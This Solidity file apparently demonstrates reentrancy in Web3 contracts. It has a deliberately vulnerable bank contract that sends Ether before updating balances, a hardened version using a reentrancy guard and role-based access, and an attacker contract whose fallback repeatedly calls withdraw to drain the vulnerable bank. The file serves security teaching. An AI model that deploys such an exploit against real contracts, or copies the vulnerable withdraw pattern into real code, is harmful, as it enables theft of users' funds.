// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title SmartContractVulnerabilityAttackDefense - Attack and Defense Simulation for General Smart Contract Vulnerabilities in Web3 Smart Contracts
/// @author ChatGPT

/// @notice Insecure Vulnerable Bank Contract (Multiple Vulnerabilities)
contract InsecureVulnerableBank {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] -= amount;

        emit Withdraw(msg.sender, amount);
    }

    receive() external payable {}
}

/// @notice Secure Hardened Bank Contract (Fixed Vulnerabilities)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";

contract SecureHardenedBank is ReentrancyGuard, AccessControl {
    bytes32 public constant DEPOSITOR_ROLE = keccak256("DEPOSITOR_ROLE");
    bytes32 public constant WITHDRAWER_ROLE = keccak256("WITHDRAWER_ROLE");

    mapping(address => uint256) private balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);

    constructor() {
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _grantRole(DEPOSITOR_ROLE, msg.sender);
        _grantRole(WITHDRAWER_ROLE, msg.sender);
    }

    function deposit() external payable onlyRole(DEPOSITOR_ROLE) {
        require(msg.value > 0, "Zero deposit not allowed");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external nonReentrant onlyRole(WITHDRAWER_ROLE) {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        balances[msg.sender] -= amount;

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        emit Withdraw(msg.sender, amount);
    }

    function grantDepositor(address user) external onlyRole(DEFAULT_ADMIN_ROLE) {
        _grantRole(DEPOSITOR_ROLE, user);
    }

    function grantWithdrawer(address user) external onlyRole(DEFAULT_ADMIN_ROLE) {
        _grantRole(WITHDRAWER_ROLE, user);
    }

    function balanceOf(address user) external view returns (uint256) {
        return balances[user];
    }

    receive() external payable {}
}

/// @notice Attack contract simulating reentrancy drain
contract VulnerabilityIntruder {
    address public targetInsecure;
    uint256 public attackAmount;

    constructor(address _targetInsecure) {
        targetInsecure = _targetInsecure;
    }

    function attack() external payable {
        require(msg.value > 0, "Send ETH");

        attackAmount = msg.value;

        (bool success, ) = targetInsecure.call{value: msg.value}(
            abi.encodeWithSignature("deposit()")
        );
        require(success, "Initial deposit failed");

        (success, ) = targetInsecure.call(
            abi.encodeWithSignature("withdraw(uint256)", attackAmount)
        );
        require(success, "Initial withdraw failed");
    }

    receive() external payable {
        if (address(targetInsecure).balance >= attackAmount) {
            targetInsecure.call(
                abi.encodeWithSignature("withdraw(uint256)", attackAmount)
            );
        }
    }
}
